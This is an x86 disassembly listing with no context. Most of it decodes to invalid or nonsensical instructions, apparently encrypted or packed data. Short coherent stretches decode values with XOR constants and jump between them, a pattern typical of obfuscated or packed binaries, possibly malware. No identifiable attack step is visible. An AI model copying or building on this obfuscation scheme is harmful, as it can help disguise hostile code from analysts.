  40bd6d:	sbb    edx,DWORD PTR [eax]
  40bd6f:	out    dx,eax
  40bd70:	push   es
  40bd71:	(bad)  
  40bd72:	push   edx
  40bd73:	repnz repz (bad) 
  40bd76:	adc    dh,BYTE PTR [eax-0x7654d106]
  40bd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd7d:	xor    BYTE PTR [edi-0x24],dl
  40bd80:	jno    0x40bddd
  40bd82:	mov    ds:0xb609c83c,al
  40bd87:	jbe    0x40bddc
  40bd89:	repnz ins DWORD PTR es:[edi],dx
  40bd8b:	retf   0x5389
  40bd8e:	leave  
  40bd8f:	icebp  
  40bd90:	outs   dx,DWORD PTR ds:[esi]
  40bd91:	push   cs
  40bd92:	jns    0x40bdf2
  40bd94:	ficomp WORD PTR [edi+0x59184845]
  40bd9a:	repz and al,0x28
  40bd9d:	ret    
  40bd9e:	lock sbb al,0xe3
  40bda1:	jno    0x40bdb3
  40bda3:	jo     0x40bdc5
  40bda5:	dec    ebx
  40bda6:	mov    ebx,0xbf5bef41
  40bdab:	aam    0xb1
  40bdad:	add    esp,DWORD PTR [ecx+0x45]
  40bdb0:	push   0xb82909a7
  40bdb5:	test   al,0x88
  40bdb7:	int3   
  40bdb8:	xchg   DWORD PTR [eax-0x5a],edi
  40bdbb:	sbb    eax,DWORD PTR [edx]
  40bdbd:	sbb    ebx,esp
  40bdbf:	dec    edx
  40bdc0:	ins    DWORD PTR es:[edi],dx
  40bdc1:	test   eax,0xbc2bb744
  40bdc6:	mov    DWORD PTR [eax+0x51],esi
  40bdc9:	mov    ebx,0x9625dfc0
  40bdce:	fyl2x  
  40bdd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdd1:	cmp    DWORD PTR [eax-0x7509e412],0xffffffaa
  40bdd8:	repnz in eax,dx
  40bdda:	sbb    bh,BYTE PTR [ecx+0x53]
  40bddd:	icebp  
  40bdde:	test   BYTE PTR [ebx-0x5e10f2f1],cl
  40bde4:	clts   
  40bde6:	jg     0x40be1a
  40bde8:	xor    DWORD PTR [ebx-0x6a934af9],esi
  40bdee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdef:	add    edi,DWORD PTR [edi+0x64bd0f28]
  40bdf5:	frstor [ebp+0x8]
  40bdf8:	push   ebx
  40bdf9:	aad    0x9a
  40bdfb:	sbb    eax,ebx
  40bdfd:	xchg   ebp,eax
  40bdfe:	ins    DWORD PTR es:[edi],dx
  40bdff:	mov    bl,BYTE PTR [edi-0x34b20eb8]
  40be05:	xchg   esi,eax
  40be06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be07:	mov    ch,0xdd
  40be09:	or     DWORD PTR [eax],edi
  40be0b:	rcl    DWORD PTR [eax],cl
  40be0d:	jecxz  0x40bddc
  40be0f:	pop    ecx
  40be10:	das    
  40be11:	cmc    
  40be12:	fs mov ecx,esp
  40be15:	aam    0x51
  40be17:	bound  ecx,QWORD PTR [edi-0x7ca56de9]
  40be1d:	mov    ebx,0x32330f4a
  40be22:	jb     0x40be75
  40be24:	sbb    DWORD PTR [ebx+0x77],0x71f40fba
  40be2b:	test   ah,0x4c
  40be2e:	jno    0x40be41
  40be30:	adc    ebx,DWORD PTR [eax+ebx*1+0x2]
  40be34:	lods   al,BYTE PTR ds:[esi]
  40be35:	out    0x8a,eax
  40be37:	out    dx,al
  40be38:	stos   BYTE PTR es:[edi],al
  40be39:	push   cs
  40be3a:	jae    0x40bdc3
  40be3c:	mov    bh,0x23
  40be3e:	int3   
  40be3f:	sahf   
  40be40:	and    ebx,esp
  40be42:	dec    BYTE PTR [ebp+edi*1+0x4f8c0e31]
  40be49:	retf   
  40be4a:	retf   0xdfc6
  40be4d:	cmp    dh,BYTE PTR [ebp+0x51fc3595]
  40be53:	pmuludq mm3,QWORD PTR [esi-0x3c]
  40be57:	in     eax,0xe8
  40be59:	and    al,0xb3
  40be5b:	retf   
  40be5c:	jle    0x40beb4
  40be5e:	inc    DWORD PTR [ebp+0x29]
  40be61:	or     eax,0x8e6dab69
  40be66:	ret    
  40be67:	sub    BYTE PTR [ebp-0x5b1d9250],0x5e
  40be6e:	enter  0x3850,0x1c
  40be72:	jns    0x446ea244
  40be78:	test   al,0x40
  40be7a:	out    0xeb,al
  40be7c:	daa    
  40be7d:	xchg   ecx,eax
  40be7e:	dec    edx
  40be7f:	or     bh,BYTE PTR [ebx+0x7b]
  40be82:	or     al,BYTE PTR [edx-0x56]
  40be85:	iret   
  40be86:	je     0x40bea1
  40be88:	stos   BYTE PTR es:[edi],al
  40be89:	dec    esi
  40be8a:	repnz lods al,BYTE PTR ds:[esi]
  40be8c:	js     0x40be73
  40be8e:	retf   0x322d
  40be91:	ins    BYTE PTR es:[edi],dx
  40be92:	stos   BYTE PTR es:[edi],al
  40be93:	leave  
  40be94:	call   FWORD PTR [edi+0x312302e]
  40be9a:	adc    edx,DWORD PTR [ebx]
  40be9c:	ja     0x40be5c
  40be9e:	jae    0x40bef3
  40bea0:	(bad)  
  40bea1:	mov    al,ds:0x6a19124
  40bea6:	push   esi
  40bea7:	popf   
  40bea8:	fs mov cl,0x4d
  40beab:	push   es
  40beac:	int3   
  40bead:	je     0x40be89
  40beaf:	popf   
  40beb0:	push   ebx
  40beb1:	in     al,dx
  40beb2:	xchg   ebp,eax
  40beb3:	sahf   
  40beb4:	xlat   BYTE PTR ds:[ebx]
  40beb5:	dec    edi
  40beb6:	es stos DWORD PTR es:[edi],eax
  40beb8:	out    dx,eax
  40beb9:	jge    0x40be4c
  40bebb:	mov    eax,0x262db8d8
  40bec0:	xor    cl,BYTE PTR [ecx]
  40bec2:	dec    DWORD PTR [edi+eiz*8+0x5]
  40bec6:	pop    edx
  40bec7:	push   ss
  40bec8:	outs   dx,DWORD PTR ds:[esi]
  40bec9:	push   ds
  40beca:	outs   dx,BYTE PTR ds:[esi]
  40becb:	mov    al,ds:0x39e36414
  40bed0:	add    cl,bh
  40bed2:	imul   esp,DWORD PTR [edx],0x25908dbe
  40bed8:	gs mov edi,0x5f4637ec
  40bede:	jbe    0x40bebf
  40bee0:	arpl   WORD PTR [edi+esi*4],si
  40bee3:	add    al,0xdf
  40bee5:	jne    0x40bf14
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x69bb8831]
  40bf27:	dec    ecx
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf58
  40bf31:	add    ah,dh
  40bf33:	call   0xbe15:0xdb9c4c2d
  40bf3a:	in     eax,0x0
  40bf3c:	dec    edi
  40bf3d:	cdq    
  40bf3e:	rcr    BYTE PTR [esi+ebp*4],cl
  40bf41:	sahf   
  40bf42:	call   0xcf99:0xa2f1fe1d
  40bf49:	loopne 0x40bed5
  40bf4b:	and    al,0x4b
  40bf4d:	pop    ebx
  40bf4e:	xchg   BYTE PTR [ebp+0x63219fb3],ch
  40bf54:	mov    ebp,0xebeedfbb
  40bf59:	das    
  40bf5a:	popa   
  40bf5b:	adc    bl,ah
  40bf5d:	sti    
  40bf5e:	mov    ds:0xf3ece4b9,al
  40bf63:	sub    DWORD PTR [ebp+ebp*1-0x3f],eax
  40bf67:	sti    
  40bf68:	out    0xf5,eax
  40bf6a:	lods   eax,DWORD PTR ds:[esi]
  40bf6b:	ja     0x40bf56
  40bf6d:	repnz repz add edi,DWORD PTR [edx+ecx*2+0x4f9d94c4]
  40bf76:	jo     0x40bf71
  40bf78:	loop   0x40bf84
  40bf7a:	mov    ds:0x92a3151d,al
  40bf7f:	stos   BYTE PTR es:[edi],al
  40bf80:	inc    esi
  40bf81:	sub    al,0x85
  40bf83:	dec    esp
  40bf84:	inc    ebp
  40bf85:	fwait
  40bf86:	loop   0x40bfb6
  40bf88:	test   eax,0x1ec13128
  40bf8d:	jbe    0x40bf38
  40bf8f:	mov    edi,ds
  40bf91:	adc    ch,BYTE PTR [eax-0x2087f0be]
  40bf97:	aad    0x2d
  40bf99:	push   0x19a09f16
  40bf9e:	lods   al,BYTE PTR ds:[esi]
  40bf9f:	ficomp DWORD PTR [edi+ebp*2+0x57a90364]
  40bfa6:	stos   BYTE PTR es:[edi],al
  40bfa7:	stos   DWORD PTR es:[edi],eax
  40bfa8:	ffreep st(3)
  40bfaa:	outs   dx,BYTE PTR ds:[esi]
  40bfab:	adc    al,0xd3
  40bfad:	js     0x40bfc9
  40bfaf:	jns    0x40c021
  40bfb1:	adc    DWORD PTR [eax-0x61],ebp
  40bfb4:	xchg   dl,al
  40bfb6:	cwde   
  40bfb7:	stos   DWORD PTR es:[edi],eax
  40bfb8:	les    ebp,FWORD PTR [eax+0x3bb74d13]
  40bfbe:	xor    BYTE PTR [edi-0x7cbb84f4],cl
  40bfc4:	push   ss
  40bfc5:	neg    DWORD PTR [ebx+ecx*1-0x7e]
  40bfc9:	or     ebx,esi
  40bfcb:	dec    edx
  40bfcc:	mov    ebx,0x6d14bf49
  40bfd1:	mov    ecx,0x701b2eb0
  40bfd6:	es push ecx
  40bfd8:	aad    0xcc
  40bfda:	rcl    ebx,1
  40bfdc:	push   cs
  40bfdd:	mov    dh,0xe3
  40bfdf:	call   0xb82c:0x67f86522
  40bfe6:	data16 mov dh,BYTE PTR [ecx-0x76debe96]
  40bfed:	outs   dx,DWORD PTR ds:[esi]
  40bfee:	inc    esi
  40bfef:	retf   
  40bff0:	xor    esi,ebp
  40bff2:	sub    eax,0xa9912da5
  40bff7:	or     esp,DWORD PTR [esi]
  40bff9:	imul   esp,edi,0xe62dbcac
  40bfff:	add    ch,BYTE PTR [eax-0x5f016bfb]
  40c005:	mov    dh,0x58
  40c007:	jns    0x40c00e
  40c009:	push   cs
  40c00a:	das    
  40c00b:	sub    ebx,esi
  40c00d:	inc    edx
  40c00e:	leave  
  40c00f:	(bad)
  40c012:	(bad)  
  40c013:	ficom  WORD PTR [edx-0x60]
  40c016:	enter  0x9d95,0x4a
  40c01a:	sub    al,0xfa
  40c01c:	mov    edi,0xf9cff91c
  40c021:	mov    ebp,0xe646fd0a
  40c026:	out    dx,eax
  40c027:	sub    DWORD PTR [edx+0xb],ecx
  40c02a:	mov    esp,0x3f2f9aee
  40c02f:	nop
  40c030:	fld    DWORD PTR [eax+eiz*1-0x791c9eb4]
  40c037:	pop    es
  40c038:	loopne 0x40c060
  40c03a:	xchg   edi,edx
  40c03c:	test   al,0x31
  40c03e:	xor    al,0x2c
  40c040:	mov    dh,0x28
  40c042:	pop    ebx
  40c043:	inc    esp
  40c044:	jl     0x40c075
  40c046:	dec    esp
  40c047:	or     DWORD PTR [edi-0x142fb4b7],0xad628a22
  40c051:	inc    dh
  40c053:	lock or dl,BYTE PTR [ebx+0x387995dd]
  40c05a:	dec    esp
  40c05b:	pop    ds
  40c05c:	ja     0x40c068
  40c05e:	dec    eax
  40c05f:	push   ss
  40c060:	mov    edi,DWORD PTR [ebx+0x7ad3c8cf]
  40c066:	adc    esi,DWORD PTR [ebp+0x57]
  40c069:	pop    ebx
  40c06a:	loope  0x40c0cd
  40c06c:	dec    ebx
  40c06d:	(bad)  
  40c06f:	jns    0x40c0ab
  40c071:	das    
  40c072:	mov    ds:0x17329c8c,al
  40c077:	fsub   st(2),st
  40c079:	into   
  40c07a:	jns    0x40c048
  40c07c:	std    
  40c07d:	pop    edi
  40c07e:	ror    BYTE PTR ds:0x6e2005a3,cl
  40c084:	jne    0x40c100
  40c086:	push   ds
  40c087:	out    dx,eax
  40c088:	inc    esp
  40c089:	aam    0x9
  40c08b:	imul   esi,DWORD PTR ds:0x6be9b261,0x2133869f
  40c095:	addr16 (bad) 
  40c097:	adc    DWORD PTR [esp+ebp*1+0x7c],esi
  40c09b:	inc    ecx
  40c09c:	adc    al,0x20
  40c09e:	mov    ds:0x96a1561e,eax
  40c0a3:	test   eax,0xa9475fcb
  40c0a8:	push   0xffffffef
  40c0aa:	mov    dl,0xa6
  40c0ac:	enter  0x5376,0x11
  40c0b0:	jg     0x40c0e5
  40c0b2:	mov    al,ds:0x8d2efe8
  40c0b7:	jmp    0x6901:0xf635e63f
  40c0be:	out    dx,al
  40c0bf:	pusha  
  40c0c0:	or     eax,0x56f0bdff
  40c0c5:	mov    ebp,0x75b29e69
  40c0ca:	(bad)  
  40c0cb:	sub    ecx,DWORD PTR [esi+0x128024ba]
  40c0d1:	ret    
  40c0d2:	stc    
  40c0d3:	(bad)  
  40c0d4:	(bad)  
  40c0d5:	adc    ch,bh
  40c0d7:	test   al,0xe0
  40c0d9:	push   ss
  40c0da:	sub    eax,0xf0bd376f
  40c0df:	xchg   BYTE PTR [edi+0x10],bh
  40c0e2:	cmp    DWORD PTR [ebx],edi
  40c0e4:	(bad)  
  40c0e5:	mov    dl,0x51
  40c0e7:	in     eax,dx
  40c0e8:	inc    eax
  40c0e9:	in     eax,dx
  40c0ea:	pop    esp
  40c0eb:	xor    al,0x93
  40c0ed:	(bad)
  40c0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0f1:	xor    BYTE PTR [edi+0x53],0xb6
  40c0f5:	inc    eax
  40c0f6:	sbb    edi,eax
  40c0f8:	and    cl,al
  40c0fa:	inc    esp
  40c0fb:	out    0x86,eax
  40c0fd:	div    DWORD PTR ds:0x7ad24415
  40c103:	das    
  40c104:	xchg   esi,eax
  40c105:	pop    esi
  40c106:	adc    al,0x85
  40c108:	shr    esp,cl
  40c10a:	mov    cl,0xa9
  40c10c:	sahf   
  40c10d:	icebp  
  40c10e:	pop    esi
  40c10f:	sbb    BYTE PTR [ecx],al
  40c111:	and    DWORD PTR [eax-0x5f],edx
  40c114:	imul   eax,eax,0x30
  40c117:	pusha  
  40c118:	pusha  
  40c119:	cs ret 
  40c11b:	call   0xe189:0xd19e48e9
  40c122:	(bad)  
  40c123:	popf   
  40c124:	jl     0x40c11a
  40c126:	or     DWORD PTR [esi+0x3bbe9029],eax
  40c12c:	mov    BYTE PTR [edx+0x5d537a2a],0xdf
  40c133:	(bad)  
  40c134:	lock jae 0x40c128
  40c137:	mov    BYTE PTR [ecx+0x56],al
  40c13a:	lahf   
  40c13b:	xlat   BYTE PTR ds:[ebx]
  40c13c:	push   eax
  40c13d:	xchg   ebp,eax
  40c13e:	mov    WORD PTR [esp+esi*2+0x6d],gs
  40c142:	loopne 0x40c132
  40c144:	addr16 push esp
  40c146:	ins    DWORD PTR es:[edi],dx
  40c147:	neg    ebp
  40c149:	sub    esp,DWORD PTR [eax+0x3]
  40c14c:	dec    ebx
  40c14d:	or     al,0xc8
  40c14f:	pop    ebp
  40c150:	(bad)  [esi]
  40c152:	push   ebx
  40c153:	xlat   BYTE PTR ds:[ebx]
  40c154:	push   ebx
  40c155:	push   0xffffffb5
  40c157:	or     esp,DWORD PTR [ecx]
  40c159:	jno    0x40c1d9
  40c15b:	test   ebx,ebx
  40c15d:	and    eax,0x909af0db
  40c162:	mov    ch,0xd
  40c164:	(bad)  
  40c165:	or     DWORD PTR [esi+edx*8+0x5d],ebp
  40c169:	pop    ebx
  40c16a:	xor    esp,DWORD PTR [edx+0x59ae3f59]
  40c170:	inc    ebx
  40c171:	lds    edi,FWORD PTR [esp+eiz*4+0x66]
  40c175:	mov    esi,0x8b49cb87
  40c17a:	inc    ebp
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x53
  40c196:	ror    BYTE PTR [edx+0x4b],1
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	les    ebx,FWORD PTR [ecx+0x3d]
  40c1a4:	cs mov dl,0xab
  40c1a8:	mov    cl,0xb1
  40c1aa:	jb     0x40c1ea
  40c1ac:	cmc    
  40c1ad:	cs push esp
  40c1af:	out    dx,al
  40c1b0:	pop    ebp
  40c1b1:	jns    0x40c1aa
  40c1b3:	xchg   BYTE PTR [ecx],ah
  40c1b5:	xchg   BYTE PTR [ebp+0x58],bh
  40c1b8:	test   al,0xc0
  40c1ba:	addr16 inc ebp
  40c1bc:	imul   eax,ebx,0x6e
  40c1bf:	fstp   TBYTE PTR [edi-0x25]
  40c1c2:	invd   
  40c1c4:	push   eax
  40c1c5:	sbb    eax,0x9436be81
  40c1ca:	fsub   QWORD PTR [edi]
  40c1cc:	inc    esp
  40c1cd:	repnz dec esp
  40c1cf:	adc    DWORD PTR [ebx+0x18],ecx
  40c1d2:	push   cs
  40c1d3:	repz add BYTE PTR [edi-0x5aab275f],0xdf
  40c1db:	dec    BYTE PTR [esi+0x50]
  40c1de:	mov    edi,0x49099dbd
  40c1e3:	test   eax,0xd77e508f
  40c1e8:	push   ebx
  40c1e9:	xor    BYTE PTR [ebp-0x61],dh
  40c1ec:	imul   edx,DWORD PTR [eax+edi*2+0x6],0xffffffc2
  40c1f1:	je     0x40c1cf
  40c1f3:	aaa    
  40c1f4:	out    0x5,al
  40c1f6:	scas   eax,DWORD PTR es:[edi]
  40c1f7:	rep lods al,BYTE PTR ds:[esi]
  40c1f9:	fild   QWORD PTR [edi-0x70]
  40c1fc:	and    BYTE PTR [ebp+esi*4-0xf023907],ah
  40c203:	jp     0x40c1b5
  40c205:	cdq    
  40c206:	fistp  QWORD PTR [ecx-0x24]
  40c209:	push   edx
  40c20a:	enter  0xa281,0x0
  40c20e:	adc    dh,cl
  40c210:	inc    edi
  40c211:	cld    
  40c212:	fstp   DWORD PTR [ecx+edx*2+0x4a]
  40c216:	je     0x40c1a4
  40c218:	lods   al,BYTE PTR ds:[esi]
  40c219:	xor    bl,BYTE PTR [esi-0x6e6b93ad]
  40c21f:	mov    eax,ds:0x9ae7714a
  40c224:	push   cs
  40c225:	push   esp
  40c226:	mov    bl,0x19
  40c228:	dec    edi
  40c229:	in     eax,dx
  40c22a:	cmp    BYTE PTR [esi],ah
  40c22c:	xchg   BYTE PTR [ebp+0x6],al
  40c22f:	adc    bl,ah
  40c231:	dec    ebp
  40c232:	mov    ?,WORD PTR [esi+0x20488277]
  40c238:	sub    ebp,ebp
  40c23a:	inc    al
  40c23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c23d:	test   eax,0x4cdfde84
  40c242:	xor    esp,0xa637095
  40c248:	shld   ebp,eax,0xc1
  40c24c:	idiv   BYTE PTR [ecx+ebx*8-0x16]
  40c250:	leave  
  40c251:	sbb    eax,0x3ca9d31c
  40c256:	add    ebp,DWORD PTR [edi]
  40c258:	xor    eax,0x42165c39
  40c25d:	pusha  
  40c25e:	hlt    
  40c25f:	lea    esp,[ebx]
  40c261:	icebp  
  40c262:	jne    0x40c2b3
  40c264:	push   0xffffff93
  40c266:	lds    edx,FWORD PTR ds:0xa0968411
  40c26c:	fimul  WORD PTR [ecx+0x5ad624f5]
  40c272:	sub    bl,BYTE PTR [ebx-0x12]
  40c275:	out    0xcb,eax
  40c277:	add    dh,BYTE PTR [eax]
  40c279:	stos   DWORD PTR es:[edi],eax
  40c27a:	std    
  40c27b:	daa    
  40c27c:	retf   
  40c27d:	pop    es
  40c27e:	sahf   
  40c27f:	out    0xaa,al
  40c281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c282:	popa   
  40c283:	ror    ch,1
  40c285:	dec    ecx
  40c286:	pop    edi
  40c287:	mov    ss,WORD PTR [esi-0x53]
  40c28a:	pop    esp
  40c28b:	sbb    al,0x83
  40c28d:	cmp    eax,0x5876b014
  40c292:	jbe    0x40c2e6
  40c294:	(bad)  
  40c295:	or     eax,0xe433b8b3
  40c29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c29b:	out    dx,eax
  40c29c:	jns    0x40c2d6
  40c29e:	xor    eax,0x2d47db6f
  40c2a3:	fucom  st(6)
  40c2a5:	mov    ebp,0xdf87ea6f
  40c2ab:	add    al,0xef
  40c2ad:	push   ebp
  40c2ae:	in     eax,0xc1
  40c2b0:	pop    esp
  40c2b1:	sti    
  40c2b2:	js     0x40c245
  40c2b4:	pop    eax
  40c2b5:	pop    edi
  40c2b6:	inc    edi
  40c2b7:	mov    cl,cl
  40c2b9:	ret    0xdbb6
  40c2bc:	push   ds
  40c2bd:	or     BYTE PTR [edx+0x1d],dl
  40c2c0:	std    
  40c2c1:	fld    TBYTE PTR [ebx-0x9]
  40c2c4:	iret   
  40c2c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2c6:	repnz adc eax,0x15647b10
  40c2cc:	push   ebp
  40c2cd:	cld    
  40c2ce:	cmp    dl,BYTE PTR [ecx-0x7d]
  40c2d1:	sahf   
  40c2d2:	jae    0x40c2d4
  40c2d4:	jmp    0xd279:0xd042079d
  40c2db:	popf   
  40c2dc:	mul    BYTE PTR [edx+esi*4-0x6bbb1111]
  40c2e3:	push   0x7b
  40c2e5:	scas   eax,DWORD PTR es:[edi]
  40c2e6:	dec    eax
  40c2e7:	jne    0x40c27e
  40c2e9:	(bad)
  40c2ec:	cld    
  40c2ed:	adc    eax,0xbbc3f04f
  40c2f2:	ja     0x40c2cd
  40c2f4:	addr16 iret 
  40c2f6:	retf   
  40c2f7:	stos   BYTE PTR es:[edi],al
  40c2f8:	jmp    0xed82:0x95696c79
  40c2ff:	and    ebx,ebx
  40c301:	cmp    DWORD PTR [ecx],edx
  40c303:	ret    
  40c304:	fild   WORD PTR [edi]
  40c306:	sbb    DWORD PTR [eax-0x5e9cb033],esp
  40c30c:	(bad)  
  40c30d:	out    0x4f,al
  40c30f:	mov    bl,BYTE PTR [ecx-0x33]
  40c312:	lods   eax,DWORD PTR ds:[esi]
  40c313:	jle    0x40c38d
  40c315:	sbb    BYTE PTR [ebp+0x1b6a60c3],bh
  40c31b:	dec    ebx
  40c31c:	add    ebx,DWORD PTR ds:0xe92b0abe
  40c322:	cmp    ebx,edx
  40c324:	(bad)  
  40c325:	sbb    ecx,DWORD PTR [ecx-0x756d845d]
  40c32b:	sub    DWORD PTR [ecx+0x6444eb8a],eax
  40c331:	stc    
  40c332:	sbb    DWORD PTR [edi+ecx*2],0xffffffeb
  40c336:	add    BYTE PTR [eax],ah
  40c338:	adc    al,0x88
  40c33a:	aas    
  40c33b:	mov    ebp,0x2245603b
  40c340:	loop   0x40c348
  40c342:	nop
  40c343:	jae    0x40c3a9
  40c345:	jne    0x40c2d4
  40c347:	out    dx,al
  40c348:	outs   dx,BYTE PTR es:[esi]
  40c34a:	mov    bh,0x28
  40c34c:	pusha  
  40c34d:	addr16 mov ebx,0xa92b403c
  40c353:	sbb    edx,ebp
  40c355:	loopne 0x40c3b6
  40c357:	add    eax,0xcf3eccd0
  40c35c:	and    ch,BYTE PTR [esi-0x7a]
  40c35f:	dec    ebp
  40c360:	or     BYTE PTR [esi-0x45],dh
  40c363:	int3   
  40c364:	add    dh,BYTE PTR [eax+0x47]
  40c367:	test   al,0xd8
  40c369:	mov    dl,ch
  40c36b:	xchg   ebx,eax
  40c36c:	inc    esp
  40c36d:	dec    edi
  40c36e:	aam    0xab
  40c370:	call   0xed7740ad
  40c375:	inc    edi
  40c376:	mov    bh,0x6b
  40c378:	cli    
  40c379:	sub    BYTE PTR [ecx+0x53],ah
  40c37c:	mov    dh,0x57
  40c37e:	sbb    ebx,DWORD PTR [edx+0x66280961]
  40c384:	pop    ds
  40c385:	cmp    eax,DWORD PTR [edx+0x2b]
  40c388:	jns    0x40c3a7
  40c38a:	pop    es
  40c38b:	cwde   
  40c38c:	into   
  40c38d:	arpl   cx,bp
  40c38f:	popa   
  40c390:	mov    ebp,0x32847135
  40c395:	repz call 0xb1800362
  40c39b:	pop    ecx
  40c39c:	xchg   ebx,eax
  40c39d:	add    eax,0x3e3296d9
  40c3a2:	repnz fidiv DWORD PTR ds:0x3b16baf6
  40c3a9:	(bad)  
  40c3aa:	mov    al,0xc8
  40c3ac:	xor    BYTE PTR [edi],0x15
  40c3af:	cmp    al,0x85
  40c3b1:	(bad)  
  40c3b2:	add    BYTE PTR [ebp+eiz*8-0x6c],0x8a
  40c3b7:	jge    0x40c3d6
  40c3b9:	ja     0x40c424
  40c3bb:	test   eax,0x2443149b
  40c3c0:	(bad)  
  40c3c1:	xor    BYTE PTR [ebx-0x110f51a],ah
  40c3c7:	xchg   ecx,eax
  40c3c8:	push   esp
  40c3c9:	and    BYTE PTR [ebp-0x5416e7d1],bl
  40c3cf:	out    dx,eax
  40c3d0:	mov    cl,0x21
  40c3d2:	ret    
  40c3d3:	dec    edi
  40c3d4:	and    DWORD PTR [ebp-0x1ef12241],esp
  40c3da:	sbb    ebp,DWORD PTR [edi+0x6785277e]
  40c3e0:	in     al,0xc
  40c3e2:	(bad)  
  40c3e3:	gs mov esp,0x458bcf8a
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcr    DWORD PTR [ecx+ecx*8],cl
  40c448:	cmp    DWORD PTR [ecx],esp
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	ja     0x40c3da
  40c454:	push   ecx
  40c455:	lods   al,BYTE PTR ds:[esi]
  40c456:	cmp    al,0x76
  40c458:	imul   eax,DWORD PTR [ebx-0x22],0xffffffdf
  40c45c:	sahf   
  40c45d:	out    dx,al
  40c45e:	sbb    esp,DWORD PTR [edx+ebp*4-0x2a90f6af]
  40c465:	pop    ecx
  40c466:	pop    eax
  40c467:	push   ebp
  40c468:	jo     0x40c4e9
  40c46a:	xchg   edx,eax
  40c46b:	test   al,0xdf
  40c46d:	and    ch,BYTE PTR [edi]
  40c46f:	ds hlt 
  40c471:	or     esp,esp
  40c473:	ficom  WORD PTR [ebp-0x42bc5644]
  40c479:	aas    
  40c47a:	xchg   BYTE PTR [eax+0x592d6663],cl
  40c480:	scas   eax,DWORD PTR es:[edi]
  40c481:	test   BYTE PTR [esi+0x54],dl
  40c484:	retf   
  40c485:	pop    ebx
  40c486:	lea    ecx,[edi+0x7ac195fd]
  40c48c:	lods   eax,DWORD PTR ds:[esi]
  40c48d:	loope  0x40c4a2
  40c48f:	sti    
  40c490:	in     al,0xc6
  40c492:	mov    ecx,0x33532120
  40c497:	fcmovb st,st(1)
  40c499:	mov    edx,0xb329750f
  40c49e:	push   ebx
  40c49f:	xchg   ebx,eax
  40c4a0:	int3   
  40c4a1:	aad    0x1b
  40c4a3:	repnz mov al,0x56
  40c4a6:	repnz mov eax,DWORD PTR ds:0x2b56bbdc
  40c4ad:	into   
  40c4ae:	or     bh,BYTE PTR [eax]
  40c4b0:	out    0x1a,al
  40c4b2:	bound  esi,QWORD PTR [ebp-0x3bfbc343]
  40c4b8:	test   eax,0xdab29ce6
  40c4bd:	fist   DWORD PTR [edi+edx*1+0x7d]
  40c4c1:	ins    DWORD PTR es:[edi],dx
  40c4c2:	idiv   BYTE PTR [edi+eiz*4-0x37]
  40c4c6:	aad    0x1
  40c4c8:	cdq    
  40c4c9:	fbstp  TBYTE PTR [edi-0x7]
  40c4cc:	sbb    BYTE PTR [eax-0x57b78fcf],ch
  40c4d2:	mov    ecx,0x4b3b0d2e
  40c4d7:	ss rcl al,1
  40c4da:	rol    DWORD PTR [edi-0x54],0x37
  40c4de:	cmc    
